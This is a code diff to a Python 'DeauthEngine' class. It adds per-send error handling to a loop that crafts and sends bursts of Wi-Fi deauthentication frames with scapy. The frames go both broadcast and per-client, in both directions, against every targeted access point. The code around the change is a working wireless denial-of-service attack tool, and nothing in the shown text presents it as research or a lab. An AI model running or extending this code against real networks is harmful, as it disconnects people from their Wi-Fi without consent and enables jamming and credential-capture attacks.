@@ -80,20 +80,34 @@ class DeauthEngine:
 
     def _deauth_loop(self):
         while self.running:
-            for bssid, clients in list(self._targets.items()):
-                # Broadcast deauth (hits all clients)
-                for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
-                    sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                          inter=0.02, verbose=False)
-                # Per-client targeted deauth (3-way)
-                for client_mac in list(clients):
-                    for frame in self._craft_deauth(bssid, client_mac, bssid):
-                        sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                              inter=0.02, verbose=False)
-                    for frame in self._craft_deauth(client_mac, bssid, bssid):
-                        sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                              inter=0.02, verbose=False)
-            time.sleep(DEAUTH_BURST_INTERVAL)
+            try:
+                for bssid, clients in list(self._targets.items()):
+                    # Broadcast deauth (hits all clients)
+                    for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
+                        try:
+                            sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
+                                  inter=0.02, verbose=False)
+                        except Exception as e:
+                            log.error(f"Deauth send failed for {bssid}: {e}")
+                    # Per-client targeted deauth (3-way)
+                    for client_mac in list(clients):
+                        for frame in self._craft_deauth(bssid, client_mac, bssid):
+                            try:
+                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
+                                      inter=0.02, verbose=False)
+                            except Exception as e:
+                                log.error(f"Deauth send failed for {client_mac}: {e}")
+                        for frame in self._craft_deauth(client_mac, bssid, bssid):
+                            try:
+                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
+                                      inter=0.02, verbose=False)
+                            except Exception as e:
+                                log.error(f"Deauth send failed for {client_mac} -> AP: {e}")
+                time.sleep(DEAUTH_BURST_INTERVAL)
+            except Exception as e:
+                log.error(f"Deauth loop error: {e}")
+                self.running = False
+                break
 
     def start(self):
         if self.running:
